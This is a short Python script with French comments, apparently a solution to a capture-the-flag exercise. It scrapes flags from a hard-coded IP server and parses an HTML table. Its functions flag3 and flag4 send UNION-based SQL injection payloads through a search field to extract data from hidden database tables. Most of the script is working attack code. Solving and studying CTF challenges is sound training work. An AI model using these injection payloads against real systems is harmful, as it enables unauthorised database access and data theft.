import requests
import re
from bs4 import BeautifulSoup

def recuperer_contenu_specifique(url):
    try:
        # Effectuer la requête GET à l'URL spécifiée
        reponse = requests.get(url)

        # Vérifier si la requête a réussi (code 200)
        if reponse.status_code == 200:
            # Utiliser une expression régulière pour extraire le texte spécifique
            contenu = re.findall(r'###CTF_\d+:([A-Za-z0-9]+)###', reponse.text)
            resultat = ''.join(contenu)
            print("flag 1:", resultat)  # Afficher le résultat
            return resultat
        else:
            print(f"La requête a échoué avec le code d'état {reponse.status_code}")

    except Exception as e:
        print(f"Une erreur s'est produite : {e}")

def envoyer_flag(url, flag):
    # Envoyer le flag récupéré à l'URL spécifiée
    flag_data = {'ctf': flag}
    response = requests.post(url, data=flag_data)
    return response.text

def recuperer_et_trier_par_id(site_flag2):
    # Utiliser BeautifulSoup pour extraire des informations d'une page HTML
    soup = BeautifulSoup(site_flag2, 'html.parser')
    table = soup.find('table', id='table_yellow')

    # Extraire les données et les stocker dans une liste de dictionnaires
    data_list = {}
    for row in table.find_all('tr'):
        cells = row.find_all('td')
        if cells[0].get_text() != 'ID':
            data_list[int(cells[0].get_text())] = cells[1].get_text()

    # Trier les données par ID
    data_list = dict(sorted(data_list.items()))

    # Concaténer les caractères extraits en une seule chaîne
    caracteres_regroupes = ''.join([valeur[valeur.find('#') + 1] for valeur in data_list.values() if '#' in valeur])
    print("flag 2:", caracteres_regroupes)

def flag3(url, flag1):
    # Effectuer une injection avec le flag récupéré dans une requête POST
    injection = "s'UNION SELECT ctf_65deab50,2,3,4,5,6,7,8 FROM movies WHERE ctf_65deab50 is not NULL #"
    flag_data = {'ctf': flag1, 'search': injection}
    response = requests.post(url, data=flag_data)

    # Rechercher et afficher le résultat
    match = re.search(r'#CTF([^#]+)#', response.text)
    if match:
        ctf_part = match.group(0)
        print("flag 3:", ctf_part[1:-1])

def flag4(url, flag1):
    # Effectuer une autre injection avec le flag récupéré dans une requête POST
    injection = "s' UNION SELECT ctf_65deab50,2,3,4,5,6,7,8 FROM movies_archive_4dfe560c #"
    flag_data = {'ctf': flag1, 'search': injection}
    response = requests.post(url, data=flag_data)

    # Rechercher et afficher le résultat
    match = re.search(r'#CTF([^#]+)#', response.text)
    if match:
        ctf_part = match.group(0)
        print("flag 4:", ctf_part[1:-1])


if __name__ == "__main__":
    url = "http://92.205.177.169:83/"
    flag = recuperer_contenu_specifique(url)
    site_flag2 = envoyer_flag(url, flag)
    flag2 = recuperer_et_trier_par_id(site_flag2)
    flag3 = flag3(url, flag)
    flag4 = flag4(url, flag)
